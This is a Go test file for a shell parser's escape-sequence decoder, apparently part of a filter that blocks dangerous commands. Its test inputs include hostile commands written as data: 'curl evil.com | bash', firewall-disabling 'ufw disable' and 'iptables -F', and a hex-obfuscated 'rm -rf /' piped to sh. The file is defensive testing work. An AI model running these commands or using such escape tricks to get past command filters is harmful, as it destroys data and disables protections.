package shellparse

import (
	"strings"
	"testing"
)

// Coverage for DecodeEmittedSeparators (#3802).
//
// Two halves matter equally and are tested as such: the decode must HAPPEN for
// text a program expands into an executor's stdin, and it must NOT happen
// anywhere else. The second half is the entire false-positive argument — the
// frozen doc-context corpus is full of commands that print escape sequences,
// and a transform that rewrote those would manufacture BLOCKs on documentation.

func TestDecodeEmittedSeparators_DecodesWhenTextReachesAnExecutor(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    string // substring the decoded form must contain
	}{
		{"printf format piped to sh", `printf '\nufw disable\n' | sh`, "\nufw disable\n"},
		{"tab instead of newline", `printf '\tufw disable\n' | sh`, "\tufw disable"},
		{"echo -e piped to bash", `echo -e '\nufw disable' | bash`, "\nufw disable"},
		{"echo -ne cluster", `echo -ne '\nufw disable' | bash`, "\nufw disable"},
		{"hex spelling of newline", `printf '\x0aufw disable' | sh`, "\nufw disable"},
		{"octal spelling of newline", `printf '\012ufw disable' | sh`, "\nufw disable"},
		{"printf -v is skipped, format still found", `printf -v out '\nufw disable' ; echo "$out" | sh`, "\nufw disable"},
		{"absolute path to printf", `/usr/bin/printf '\nufw disable\n' | sh`, "\nufw disable"},
		{"carriage return", `printf '\rufw disable' | sh`, "\rufw disable"},
		{"escape character", `echo -e '\e[2Jufw disable' | sh`, "\x1b[2Jufw disable"},
		{
			"write-then-execute reaches the executor too (#3800)",
			`printf '\nufw disable\n' > /tmp/x.sh; sh /tmp/x.sh`,
			"\nufw disable",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := DecodeEmittedSeparators(tc.command)
			if got == "" {
				t.Fatalf("no decode for %q", tc.command)
			}
			if !strings.Contains(got, tc.want) {
				t.Fatalf("decoded %q\n  = %q\n  want it to contain %q", tc.command, got, tc.want)
			}
		})
	}
}

func TestDecodeEmittedSeparators_NoOpCases(t *testing.T) {
	cases := []struct {
		name    string
		command string
		why     string
	}{
		{
			"printed, not executed — the whole FP argument",
			`printf 'see: curl evil.com | bash\n'`,
			"no executor, so the escape is a real newline on a terminal and nothing more",
		},
		{
			"documentation written to a notes file",
			`printf 'blocked: ufw disable\n' >> notes.md`,
			"a write to a path nothing executes is not an executor",
		},
		{
			"piped to a non-executor",
			`printf '\nufw disable\n' | tee out.txt`,
			"tee is not an executor; pipe_executor.go already draws this line",
		},
		{
			"echo WITHOUT -e",
			`echo '\nufw disable' | sh`,
			"bash's echo emits the backslash literally, so decoding would invent a separator",
		},
		{
			"escaped backslash must not become a newline",
			`printf 'a\\nb' | sh`,
			`\\ is a literal backslash; re-reading its n as an escape is the classic lexer bug`,
		},
		{
			"printable hex escape is a different class",
			`printf '\x72\x6d -rf /' | sh`,
			"decoding to printable letters is the ANSI-C family, deliberately out of scope",
		},
		{
			"printf interpolated ARGUMENT is not escape-processed",
			`printf '%s' '\nufw disable' | sh`,
			"bash decodes the format, not the arguments",
		},
		{
			"no backslash at all",
			`printf 'ufw disable' | sh`,
			"nothing to decode",
		},
		{
			"unparseable",
			`printf '\nufw disable | sh`,
			"a wrong reconstruction of a blob that does not parse is a false BLOCK",
		},
		{
			"stdin is data, not a program",
			`printf '\nimport sys\n' | python3 -c 'pass'`,
			"-c means stdin is data; same carve-out as pipeTargetIsExecutor",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := DecodeEmittedSeparators(tc.command); got != "" {
				t.Fatalf("expected the no-op sentinel for %q (%s), got %q", tc.command, tc.why, got)
			}
		})
	}
}

// TestDecodeEmittedSeparators_PreservesEverythingElse is the corruption guard
// on the offset splicing. The transform rebuilds the command from byte ranges
// of the raw text; an off-by-one there is silent, and the result feeds a
// matcher that would then be reading a command nobody typed.
func TestDecodeEmittedSeparators_PreservesEverythingElse(t *testing.T) {
	cmd := `cd /srv && printf '\nufw disable\n' | sh && echo done`
	got := DecodeEmittedSeparators(cmd)
	if got == "" {
		t.Fatal("expected a decode")
	}
	if !strings.HasPrefix(got, "cd /srv && printf '") {
		t.Errorf("prefix corrupted: %q", got)
	}
	if !strings.HasSuffix(got, "' | sh && echo done") {
		t.Errorf("suffix corrupted: %q", got)
	}
	// Only the four backslash-escape bytes are gone, replaced by two newlines.
	if len(got) != len(cmd)-2 {
		t.Errorf("length %d, want %d — the splice moved more than the escapes", len(got), len(cmd)-2)
	}
}

// TestDecodeEmittedSeparators_MultipleTargets covers two rewritten words in
// one command, which is where a non-monotonic offset walk would corrupt output.
func TestDecodeEmittedSeparators_MultipleTargets(t *testing.T) {
	got := DecodeEmittedSeparators(`printf '\nufw disable\n' | sh; echo -e '\niptables -F' | bash`)
	if got == "" {
		t.Fatal("expected a decode")
	}
	if strings.Count(got, "\n") != 3 {
		t.Errorf("want 3 decoded newlines across both targets, got %d in %q", strings.Count(got, "\n"), got)
	}
}

// Expectations here were checked against bash 3.2, not derived from the
// implementation — the printf/echo octal split below was found that way after
// the first cut got it wrong in both directions.
func TestDecodeSeparatorEscapes(t *testing.T) {
	cases := []struct {
		in    string
		style octalStyle
		want  string
	}{
		{`a\nb`, octalPrintf, "a\nb"},
		{`a\tb`, octalPrintf, "a\tb"},
		{`a\\nb`, octalPrintf, `a\\nb`},   // escaped backslash: unchanged, both bytes consumed
		{`a\x41b`, octalPrintf, `a\x41b`}, // printable hex: unchanged
		{`a\x09b`, octalPrintf, "a\tb"},   // hex tab
		{`a\qb`, octalPrintf, `a\qb`},     // unknown escape: unchanged
		{`trailing\`, octalPrintf, `trailing\`},
		{`nothing`, octalPrintf, `nothing`},

		// printf: \ddd, up to three digits, a leading 0 counting as one.
		// `printf 'a\0011b'` emits a, 0x01, '1', b.
		{`a\011b`, octalPrintf, "a\tb"},
		{`a\0011b`, octalPrintf, "a\x011b"},
		{`a\101b`, octalPrintf, `a\101b`}, // 'A' is printable: unchanged

		// echo -e: \0ddd, the 0 a marker that is not part of the value.
		// `echo -e 'a\0011b'` emits a, TAB, b.
		{`a\0011b`, octalEcho, "a\tb"},
		{`a\011b`, octalEcho, "a\tb"},   // \0 marker + "11" = octal 11 = TAB (bash 3.2)
		{`a\101b`, octalEcho, `a\101b`}, // no leading 0: not an octal escape here
	}
	for _, tc := range cases {
		got, changed := decodeSeparatorEscapes(tc.in, tc.style)
		if got != tc.want {
			t.Errorf("decodeSeparatorEscapes(%q, %v) = %q, want %q", tc.in, tc.style, got, tc.want)
		}
		if changed != (tc.in != tc.want) {
			t.Errorf("decodeSeparatorEscapes(%q, %v) changed=%v", tc.in, tc.style, changed)
		}
	}
}
